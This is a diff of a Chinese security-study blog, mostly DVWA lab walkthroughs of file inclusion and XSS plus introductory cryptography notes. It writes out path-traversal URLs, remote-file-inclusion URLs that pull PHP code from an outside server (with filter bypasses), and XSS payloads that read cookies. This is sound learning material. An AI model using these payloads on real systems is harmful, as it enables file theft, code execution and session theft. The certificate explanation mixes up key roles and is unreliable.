@@ -199,6 +199,7 @@
 
       
           
+
       
     </div>
 
@@ -271,42 +272,48 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数<strong>（include()，require()和include_once()，require_once()）</strong>利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
-<h2 id="低等级"><a href="#低等级" class="headerlink" title="低等级"></a>低等级</h2><ol>
+          <h1 id="文件包含">文件包含</h1>
+<h2 id="概念">概念</h2>
+<p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数<strong>（include()，require()和include_once()，require_once()）</strong>利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
+<h2 id="低等级">低等级</h2>
+<ol type="1">
 <li>在网页上，服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</li>
 </ol>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317213618855.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317213618855.png"></p>
 <p>可以看到依次点击可以返回<code>file1.php</code>、<code>file2.php</code>、<code>file3.php</code> 的内容</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215051380.png" alt></p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215106647.png" alt></p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215122724.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215051380.png"></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215106647.png"></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215122724.png"></p>
 <p>随便输入一个文件名</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215230874.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215230874.png"></p>
 <p>报错，页面显示错误信息，没有这个文件（因为不是系统），但是暴露了服务器文件的绝对路径，于是根据经验找到了一些有趣的东西</p>
 <p>构造绝对路径：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.1*.*/dvwa/vulnerabilities/fi/?page=E:\software\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
 <p>构造相对路径：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.1*.*/dvwa/vulnerabilities/fi/?page=..\..\..\..\..\software\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
 <p>可以得到文件的内容：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215412124.png" alt></p>
-<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>在服务器的php配置中，当选项allow_url_fopen与allow_url_include为开启状态 时，服务器会允许包含远程远程服务器上的文件，如果对文件来源没有检查， 就会导致 任意远程代码执行，还记得前面的这句话：服务器包含文件时，不管文件后缀是否是 php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215412124.png"></p>
+<h3 id="远程文件包含">远程文件包含</h3>
+<p>在服务器的php配置中，当选项allow_url_fopen与allow_url_include为开启状态 时，服务器会允许包含远程远程服务器上的文件，如果对文件来源没有检查， 就会导致 任意远程代码执行，还记得前面的这句话：服务器包含文件时，不管文件后缀是否是 php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
 <p>我们新建一个txt文件，输入以下内容：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220328003.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220328003.png"></p>
 <p>我们用python创建一个文件服务器</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220304856.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220304856.png"></p>
 <p>可以看到我们成功创建了一个文件服务器并上传了一个文件：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220358559.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220358559.png"></p>
 <p>我们通过输入url</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.*.*/dvwa/vulnerabilities/fi/?page=http://10.19.*.*:8000/poc.txt</span><br></pre></td></tr></table></figure>
 <p>可以成功的得到php的信息</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220913282.png" alt></p>
-<h3 id="中等级"><a href="#中等级" class="headerlink" title="中等级"></a>中等级</h3><p>1.查看代码可知，Medium级别的代码增加了str_replace函数，对page参数进行了一定的 处理，将”http:// ”、”<a target="_blank" rel="noopener" href="https://”、">https://”、</a> ” ../”、”..\”替换为空字符，即删除，对于相对路径包含 以及远程文件包含有一定的防御作用。</p>
-<p>2.文件包含的限制绕过<br>使用str_replace函数是极其不安全的，因为可以使用双写绕过规则，比如像下面这样~~page=ht<a target="_blank" rel="noopener" href="http://tp://106.13.129.216:8000/phpinfo.txt但str_replace函数会将中间的http：//删除，于是就只剩下http://106.13.129.216:8000/phpinfo.txt，相对路径也可以通过类似方法绕过，同时，相对路径不在防御范围内，所以还是可以直接用。">http://tp://106.13.129.216:8000/phpinfo.txt但str_replace函数会将中间的http：//删除，于是就只剩下http://106.13.129.216:8000/phpinfo.txt，相对路径也可以通过类似方法绕过，同时，相对路径不在防御范围内，所以还是可以直接用。</a></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220913282.png"></p>
+<h3 id="中等级">中等级</h3>
+<p>1.查看代码可知，Medium级别的代码增加了str_replace函数，对page参数进行了一定的 处理，将”http:// ”、”https://”、 ” ../”、”..”替换为空字符，即删除，对于相对路径包含 以及远程文件包含有一定的防御作用。</p>
+<p>2.文件包含的限制绕过 使用str_replace函数是极其不安全的，因为可以使用双写绕过规则，比如像下面这样~~page=hthttp://tp://106.13.129.216:8000/phpinfo.txt但str_replace函数会将中间的http：//删除，于是就只剩下http://106.13.129.216:8000/phpinfo.txt，相对路径也可以通过类似方法绕过，同时，相对路径不在防御范围内，所以还是可以直接用。</p>
 <p>通过大小写也可以绕过。</p>
 <p>相对路径可以通过以下方式绕过。</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317221636399.png" alt></p>
-<h2 id="高等级"><a href="#高等级" class="headerlink" title="高等级"></a>高等级</h2><p>1.可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。 </p>
-<p>2.漏洞利用<br>    High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以 利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个 本地文件时，用的就是file协议。</p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317221636399.png"></p>
+<h2 id="高等级">高等级</h2>
+<p>1.可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
+<p>2.漏洞利用 High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以 利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个 本地文件时，用的就是file协议。</p>
 <p>我们在前面加上file:///就可以打开文件</p>
 
       
@@ -381,47 +388,53 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="信息安全概论（2）"><a href="#信息安全概论（2）" class="headerlink" title="信息安全概论（2）"></a>信息安全概论（2）</h1><h2 id="2-1-密码学基本概念——加密和解密"><a href="#2-1-密码学基本概念——加密和解密" class="headerlink" title="2.1 密码学基本概念——加密和解密"></a>2.1 密码学基本概念——加密和解密</h2><h3 id="机密与真实性的解决方法——加密"><a href="#机密与真实性的解决方法——加密" class="headerlink" title="机密与真实性的解决方法——加密"></a>机密与真实性的解决方法——加密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">  明文--加密算法 加密密钥--&gt;密文</span><br><span class="line">  密文--解密算法 解密密钥--&gt;明文</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="两种密码体制"><a href="#两种密码体制" class="headerlink" title="两种密码体制"></a>两种密码体制</h3><h4 id="单钥密码体制"><a href="#单钥密码体制" class="headerlink" title="单钥密码体制"></a>单钥密码体制</h4><p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/信息安全概论(2" alt>\image-20220316164218625.png)</p>
+          <h1 id="信息安全概论2">信息安全概论（2）</h1>
+<h2 id="密码学基本概念加密和解密">2.1 密码学基本概念——加密和解密</h2>
+<h3 id="机密与真实性的解决方法加密">机密与真实性的解决方法——加密</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">  明文--加密算法 加密密钥--&gt;密文</span><br><span class="line">  密文--解密算法 解密密钥--&gt;明文</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="两种密码体制">两种密码体制</h3>
+<h4 id="单钥密码体制">单钥密码体制</h4>
+<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/image-20220316164218625.png"></p>
 <blockquote>
 <p>加密密钥和解密密钥相同，或能相互推导</p>
 </blockquote>
 <p>单钥算法不能提供抗抵赖保护。</p>
-<ol>
+<ol type="1">
 <li>数据世界中，复制件和原件是不可区分的。</li>
 <li>通信双方对密文Y有对等的生产能力。</li>
 </ol>
 <p>所以单钥密码算法也被称为对称密码算法。</p>
 <p>单钥密码加密的应用条件：</p>
-<p>​    需要敌人拿不到数据的安全信道传递共用的密钥。</p>
-<h4 id="双钥密码体制"><a href="#双钥密码体制" class="headerlink" title="双钥密码体制"></a>双钥密码体制</h4><p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/信息安全概论(2" alt>\image-20220316164723920.png)</p>
+<p>​ 需要敌人拿不到数据的安全信道传递共用的密钥。</p>
+<h4 id="双钥密码体制">双钥密码体制</h4>
+<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/image-20220316164723920.png"></p>
 <blockquote>
 <p>加密密钥和解密密钥不相同，且不能相互推导</p>
 </blockquote>
 <p>双钥算法之一 —— RSA算法</p>
-<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/信息安全概论(2" alt>\image-20220316172136374.png)</p>
-<p>加密：$c=m^e \mod {n}$</p>
-<p>解密：$c^d \mod n = m$</p>
+<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/image-20220316172136374.png"></p>
+<p>加密：<span class="math inline">\(c=m^e \mod {n}\)</span></p>
+<p>解密：<span class="math inline">\(c^d \mod n = m\)</span></p>
 <blockquote>
 <p>知道加密密钥推断不出解密密钥</p>
 </blockquote>
-<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/信息安全概论(2" alt>\image-20220316174502949.png)</p>
+<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/image-20220316174502949.png"></p>
 <p>假设一个场景：A与B要进行通信，C为可能的窃听者，双钥密码体制工作如下。</p>
 <p><strong>工作流程：</strong></p>
-<ol>
+<ol type="1">
 <li>由A产生加密密钥和解密密钥</li>
 <li>A将加密密钥公开出去，B和C都能接收到加密密钥。</li>
 <li>B通过加密密钥加密明文发送给A，A通过解密密钥就可以解密出明文。</li>
 </ol>
 <p>这个过程中就可以不通过安全信道传输信息他，同时通过加密密钥也不能推导出解密密钥，所以信息可以安全的传输。</p>
-<h4 id="2-3-4-双钥密码小结"><a href="#2-3-4-双钥密码小结" class="headerlink" title="2.3.4 双钥密码小结"></a>2.3.4 双钥密码小结</h4><p>两把钥匙：加密能力和解密能力是非对称的。</p>
+<h4 id="双钥密码小结">2.3.4 双钥密码小结</h4>
+<p>两把钥匙：加密能力和解密能力是非对称的。</p>
 <p><strong>公开加密密钥：</strong></p>
 <p>目的：机密性</p>
 <p>优点：降低对安全信道的依赖</p>
-<div class="table-container">
 <table>
 <thead>
-<tr>
+<tr class="header">
 <th>机密性</th>
 <th>可鉴别性</th>
 <th>完整性</th>
@@ -429,7 +442,7 @@
 </tr>
 </thead>
 <tbody>
-<tr>
+<tr class="odd">
 <td>√</td>
 <td>×</td>
 <td>√</td>
@@ -437,14 +450,12 @@
 </tr>
 </tbody>
 </table>
-</div>
 <p><strong>公开解密密钥：</strong></p>
 <p>目的：真实性</p>
 <p>优点：提供了抗抵赖的”证据“</p>
-<div class="table-container">
 <table>
 <thead>
-<tr>
+<tr class="header">
 <th>机密性</th>
 <th>可鉴别性</th>
 <th>完整性</th>
@@ -452,7 +463,7 @@
 </tr>
 </thead>
 <tbody>
-<tr>
+<tr class="odd">
 <td>×</td>
 <td>√</td>
 <td>√</td>
@@ -460,24 +471,24 @@
 </tr>
 </tbody>
 </table>
-</div>
-<h4 id="2-6-1-数字签名的基本原理和物理签名的区别"><a href="#2-6-1-数字签名的基本原理和物理签名的区别" class="headerlink" title="2.6.1 数字签名的基本原理和物理签名的区别"></a><strong>2.6.1 数字签名的基本原理和物理签名的区别</strong></h4><p><strong>物理签名：</strong>基于物理载体不可伪造，通过物理载体对其上的内容负责。</p>
+<h4 id="数字签名的基本原理和物理签名的区别"><strong>2.6.1 数字签名的基本原理和物理签名的区别</strong></h4>
+<p><strong>物理签名：</strong>基于物理载体不可伪造，通过物理载体对其上的内容负责。</p>
 <p><strong>数字签名：</strong>直接基于数据内容不可伪造，没有物理载体。</p>
-<h4 id="2-7-1-数字签名与数字证书"><a href="#2-7-1-数字签名与数字证书" class="headerlink" title="2.7.1 数字签名与数字证书"></a>2.7.1 数字签名与数字证书</h4><p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/信息安全概论(2" alt="image-20220318141759531">\image-20220318141759531.png)</p>
+<h4 id="数字签名与数字证书">2.7.1 数字签名与数字证书</h4>
+<figure>
+<img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/image-20220318141759531.png" alt="image-20220318141759531"><figcaption aria-hidden="true">image-20220318141759531</figcaption>
+</figure>
 <p>我们以用户向服务器传输加密数据来阐述证书、公私钥和可信第三方的关系：</p>
-<ol>
-<li><p>可信第三方产生公私钥，用私钥对服务器信息进行加密，然后将公钥公布出去。</p>
-</li>
+<ol type="1">
+<li><p>可信第三方产生公私钥，用私钥对服务器信息进行加密，然后将公钥公布出去。</p></li>
 <li><p>用户向服务器传输数据的时候，先用公钥对签名信息进行解密。</p>
 <blockquote>
 <p>这一步可以保证数据的真实性，因为是可信第三方签名认证的。</p>
-</blockquote>
-</li>
+</blockquote></li>
 <li><p>接着服务器通过公开的加密私钥对数据进行加密，将数据传输给服务器。</p>
 <blockquote>
 <p>这一步可以保证数据的机密性，用这个公钥给服务器发送的机密数据，只有服务器可以解开。</p>
-</blockquote>
-</li>
+</blockquote></li>
 </ol>
 
       
@@ -546,15 +557,21 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="信息安全概论（1）"><a href="#信息安全概论（1）" class="headerlink" title="信息安全概论（1）"></a>信息安全概论（1）</h1><h2 id="1-1-1安全风险分析与安全对策"><a href="#1-1-1安全风险分析与安全对策" class="headerlink" title="1.1.1安全风险分析与安全对策"></a>1.1.1安全风险分析与安全对策</h2><h2 id="安全分析"><a href="#安全分析" class="headerlink" title="安全分析"></a>安全分析</h2><p>要保护对象的<strong>价值、弱点、威胁</strong></p>
-<h3 id="安全对策（PDRRP）"><a href="#安全对策（PDRRP）" class="headerlink" title="安全对策（PDRRP）"></a>安全对策（<strong>PDRR</strong>P）</h3><ul>
+          <h1 id="信息安全概论1">信息安全概论（1）</h1>
+<h2 id="安全风险分析与安全对策">1.1.1安全风险分析与安全对策</h2>
+<h2 id="安全分析">安全分析</h2>
+<p>要保护对象的<strong>价值、弱点、威胁</strong></p>
+<h3 id="安全对策pdrrp">安全对策（<strong>PDRR</strong>P）</h3>
+<ul>
 <li><strong>保护</strong></li>
 <li><strong>检测</strong></li>
 <li><strong>反应</strong></li>
 <li><strong>恢复</strong></li>
 <li>惩罚</li>
 </ul>
-<h2 id="1-2-1-可用性、真实性、机密性"><a href="#1-2-1-可用性、真实性、机密性" class="headerlink" title="1.2.1 可用性、真实性、机密性"></a>1.2.1 可用性、真实性、机密性</h2><h3 id="信息的可用性"><a href="#信息的可用性" class="headerlink" title="信息的可用性"></a>信息的可用性</h3><p>信息系统提供服务的能力</p>
+<h2 id="可用性真实性机密性">1.2.1 可用性、真实性、机密性</h2>
+<h3 id="信息的可用性">信息的可用性</h3>
+<p>信息系统提供服务的能力</p>
 <blockquote>
 <ul>
 <li>病毒导致的计算机系统瘫痪</li>
@@ -562,36 +579,38 @@
 <li>黑客进行的拒绝服务攻击</li>
 </ul>
 </blockquote>
-<h3 id="信息的真实性"><a href="#信息的真实性" class="headerlink" title="信息的真实性"></a>信息的真实性</h3><ul>
+<h3 id="信息的真实性">信息的真实性</h3>
+<ul>
 <li><p>可鉴别性</p>
 <blockquote>
 <p>是周瑜发给我的还是曹操发给我的</p>
-</blockquote>
-</li>
+</blockquote></li>
 <li><p>完整性</p>
 <blockquote>
 <p>是不是发送过程中被改了</p>
-</blockquote>
-</li>
-<li><p>抗抵赖 (面对双方不可信的条件下,提供保障)</p>
-</li>
+</blockquote></li>
+<li><p>抗抵赖 (面对双方不可信的条件下,提供保障)</p></li>
 </ul>
-<h3 id="信息的机密性"><a href="#信息的机密性" class="headerlink" title="信息的机密性"></a>信息的机密性</h3><p>9月14日组织进攻</p>
-<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA/image-20220316094317271.png" alt></p>
-<h2 id="1-3-1-信息安全模型"><a href="#1-3-1-信息安全模型" class="headerlink" title="1.3.1 信息安全模型"></a>1.3.1 信息安全模型</h2><p>信息安全模型：信息在传输、存储和处理过程中保护信息的<strong>CIA</strong></p>
+<h3 id="信息的机密性">信息的机密性</h3>
+<p>9月14日组织进攻</p>
+<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA/image-20220316094317271.png"></p>
+<h2 id="信息安全模型">1.3.1 信息安全模型</h2>
+<p>信息安全模型：信息在传输、存储和处理过程中保护信息的<strong>CIA</strong></p>
 <blockquote>
 <p>机密性：Confidentiality</p>
 <p>完整性：Integrity</p>
 <p>可用性 ：Availability</p>
 </blockquote>
-<h2 id="1-4-1-信息时代和信息的价值"><a href="#1-4-1-信息时代和信息的价值" class="headerlink" title="1.4.1 信息时代和信息的价值"></a>1.4.1 信息时代和信息的价值</h2><p><strong>数据</strong> ： 客观事物的符号表示。</p>
+<h2 id="信息时代和信息的价值">1.4.1 信息时代和信息的价值</h2>
+<p><strong>数据</strong> ： 客观事物的符号表示。</p>
 <p><strong>信息</strong> ：有用的数据，能消除主体疑问的数据，能指导主体的行为的数据。</p>
 <ul>
 <li>数据是信息的载体，但信息不等于数据。</li>
 <li>数据中包含信息，但得到数据未必能得到信息，即能指导主体行为。</li>
 </ul>
-<h2 id="1-5-1-信息系统的弱点"><a href="#1-5-1-信息系统的弱点" class="headerlink" title="1.5.1 信息系统的弱点"></a>1.5.1 信息系统的弱点</h2><ol>
-<li>设计上的问题——通常缺乏安全的考虑，比如 $arp$ 病毒。</li>
+<h2 id="信息系统的弱点">1.5.1 信息系统的弱点</h2>
+<ol type="1">
+<li>设计上的问题——通常缺乏安全的考虑，比如 <span class="math inline">\(arp\)</span> 病毒。</li>
 <li>实现上的问题——代码编写中，有意后门和无意的bug。</li>
 <li>配置上的问题——默认的服务。</li>
 <li>管理上的问题——弱的口令，内部人员无意或恶意的操作。</li>
@@ -669,51 +688,63 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="XSS笔记"><a href="#XSS笔记" class="headerlink" title="XSS笔记"></a>XSS笔记</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308095657142.png" alt></p>
+          <h1 id="xss笔记">XSS笔记</h1>
+<h2 id="xss简介">XSS简介</h2>
+<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308095657142.png"></p>
 <blockquote>
 <p>反射型XSS只会中招一次，存储型XSS每次打开都会中招，很烦人。DOM型XSS接触的不多。</p>
 </blockquote>
-<h2 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h2><h3 id="低等级"><a href="#低等级" class="headerlink" title="低等级"></a>低等级</h3><p>代码直接引用了name参数，并没有做任何过滤和检查，存在明显的XSS漏洞。</p>
-<p>在对话框键入<code>&lt;script&gt;alert(&quot;111&quot;)&lt;/script&gt;</code> 就完成了一次低等级的XSS攻击。</p>
+<h2 id="反射型xss漏洞">反射型XSS漏洞</h2>
+<h3 id="低等级">低等级</h3>
+<p>代码直接引用了name参数，并没有做任何过滤和检查，存在明显的XSS漏洞。</p>
+<p>在对话框键入<code>&lt;script&gt;alert("111")&lt;/script&gt;</code> 就完成了一次低等级的XSS攻击。</p>
 <p>可以看到浏览器上方弹出</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308100719863.png" alt></p>
-<h3 id="中等级"><a href="#中等级" class="headerlink" title="中等级"></a>中等级</h3><p> 观察代码发现对输入的数据进行的过滤，将script关键词删除，但是这种机制很容易被绕过。</p>
-<ol>
+<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308100719863.png"></p>
+<h3 id="中等级">中等级</h3>
+<p>观察代码发现对输入的数据进行的过滤，将script关键词删除，但是这种机制很容易被绕过。</p>
+<ol type="1">
 <li>这时我们可以通过输入<code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code> 伪装外部的<code>&lt;script&gt;</code> 进行攻击。</li>
 </ol>
 <p>可以看到浏览器成功弹窗</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308101757917.png" alt></p>
-<ol>
+<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308101757917.png"></p>
+<ol start="2" type="1">
 <li>我们还可以通过混用大小写的方式进行XSS攻击</li>
 </ol>
-<p>我们输入<code>&lt;ScriPt&gt;alert(111)&lt;/script&gt;</code> ，点击$submit$ 进行提交也可以看到成功弹窗。</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308102802413.png" alt></p>
-<p>​         </p>
-<h3 id="高等级"><a href="#高等级" class="headerlink" title="高等级"></a>高等级</h3><p>观察代码发现使用黑名单过滤输入，其中preg_replace()函数用于正则表达式的搜索和替换，这使双写绕过和大小写混写绕过全部失效。</p>
-<p>我们可以通过 $img$ , $body$ 等标签注入js代码。</p>
+<p>我们输入<code>&lt;ScriPt&gt;alert(111)&lt;/script&gt;</code> ，点击<span class="math inline">\(submit\)</span> 进行提交也可以看到成功弹窗。</p>
+<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308102802413.png"></p>
+<p>​</p>
+<h3 id="高等级">高等级</h3>
+<p>观察代码发现使用黑名单过滤输入，其中preg_replace()函数用于正则表达式的搜索和替换，这使双写绕过和大小写混写绕过全部失效。</p>
+<p>我们可以通过 <span class="math inline">\(img\)</span> , <span class="math inline">\(body\)</span> 等标签注入js代码。</p>
 <p>我们在对话框中输入代码： <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
 <p>提交后可以看到成功进行了弹窗</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308111137012.png" alt></p>
-<h2 id="存储型XSS漏洞"><a href="#存储型XSS漏洞" class="headerlink" title="存储型XSS漏洞"></a>存储型XSS漏洞</h2><h3 id="低等级-1"><a href="#低等级-1" class="headerlink" title="低等级"></a>低等级</h3><p>strip_tags()函数可以剥去字符串中的HTML，XML以及PHP的标签，但允许使用标签。  addslashes()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加 反斜杠的字符串。 可以看到，由于对message参数使用了htmlspecialchars函数进行编码，无法在使用 message参数注入XSS代码，但是对于name参数，只是简单过滤了标签，所以仍存在存储型的XSS 。</p>
-<h4 id="在message进行xss攻击"><a href="#在message进行xss攻击" class="headerlink" title="在message进行xss攻击"></a>在message进行xss攻击</h4><p>在message栏输入<code>&lt;script&gt;alert(&quot;/xss/&quot;)&lt;/script&gt;</code></p>
+<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308111137012.png"></p>
+<h2 id="存储型xss漏洞">存储型XSS漏洞</h2>
+<h3 id="低等级-1">低等级</h3>
+<p>strip_tags()函数可以剥去字符串中的HTML，XML以及PHP的标签，但允许使用标签。 addslashes()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加 反斜杠的字符串。 可以看到，由于对message参数使用了htmlspecialchars函数进行编码，无法在使用 message参数注入XSS代码，但是对于name参数，只是简单过滤了标签，所以仍存在存储型的XSS 。</p>
+<h4 id="在message进行xss攻击">在message进行xss攻击</h4>
